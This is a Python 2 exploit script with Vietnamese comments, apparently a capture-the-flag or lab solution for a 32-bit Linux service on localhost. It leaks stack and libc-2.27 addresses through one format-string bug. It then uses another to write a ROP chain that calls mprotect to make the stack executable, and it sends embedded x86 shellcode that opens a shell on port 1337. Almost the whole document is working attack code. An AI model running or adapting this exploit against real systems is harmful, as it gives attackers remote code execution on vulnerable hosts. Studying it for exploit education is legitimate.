#Ta thay ham sprintf(dest, buf) tai 0x08048a2a bi loi format string, ta co the leak dc cac thong tin trong stack
#-> Ta leak duoc dia chi buf va 1 dia chi nam trong libc-2.27.so
#Tu dia chi nam trong libc-2.27.so ta tinh duoc base libc -> addr cua ham mprotect
#ta xay dung rop chay ham mprotect cap quyen rwx cho vung nho tren stack sau do nhay den dia chi cua shellcode tren stack de chay shellcode
#Ta thay ham printf(buf) tai 0x08048c62 bi loi format string, ta co the ghi noi dung tuy y vao dia chi mong muon
#-> Ghi ROP = loi format string

import socket
import struct
import time

host = "127.0.0.1"
port = 1234
offset_mprotect = 0xf4660

print 'offset <mprotect> in /lib/i386-linux-gnu/libc-2.27.so - XUbuntu 18.04-i386 = ' + hex(offset_mprotect)

#reverse shell port 1337
shell = "\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"

def fmt(addr, dest, s):
	print '.'
	if addr < 0x18000:
		payload = struct.pack('<I', dest) + '%' + str(addr-4) + 'p%7$n'
		time.sleep(0.5)		
		s.send(payload)	

	else:
		a = hex(addr)
		if len(a) == 9:
			a = a[0:2] + '0' + a[2:9]
		if len(a) == 8:
			a = a[0:2] + '00' + a[2:8]
		op = int(a[2:6],16) - 4
		payload = struct.pack('<I', dest + 2) + '%' + str(op) + 'p%7$hn'
		time.sleep(0.5)		
		s.send(payload)	
		op = int(a[6:10],16) - 4
		payload = struct.pack('<I', dest) + '%' + str(op) + 'p%7$hn'
		time.sleep(0.5)		
		s.send(payload)	

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

payload = '\x00\x04\x00\x00%6$p %50$p %51$p'
payload2 = 'aaaa%99999p%7$n'

#leak addr------------------------------------------------------
time.sleep(0.5)
s.send(payload)
time.sleep(0.5)

a = s.recv(1024)
leak = int(a[57:65],16)					#addr in /lib/i386-linux-gnu/libc-2.27.so
buf = int(a[41:49],16)					#addr buf

addr_to_mprotect = int(a[41:46] + '000', 16)		
ret = buf + 0x410
base = leak - 0x1cb8
mprotect = base + offset_mprotect
print '-------leak------------------'
print 'base libc-2.27.so = ' + hex(base)
print 'buf 		  = ' + hex(buf)
print 'addr mprotect 	  = ' + hex(mprotect)
print '-----------------------------'
print 'send payload'
#send payload------------------------------------------------------------------
fmt(mprotect, ret, s)					#addr mprotect
fmt(buf+4, ret + 4, s)					#ret mprotect -> addr buf + 4
fmt(addr_to_mprotect, ret + 8, s)			#addr 
fmt(0x2000, ret + 12, s)				#size
time.sleep(0.5)
payload = struct.pack('<I', ret + 16) + 'aaa%7$n'
s.send(payload)						#0x7 = rwx
payload = 'QUIT' + shell
time.sleep(0.5)
s.send(payload)
print 'done'
print '---------------------------'
print 'reverse shell running on port 1337'
raw_input()

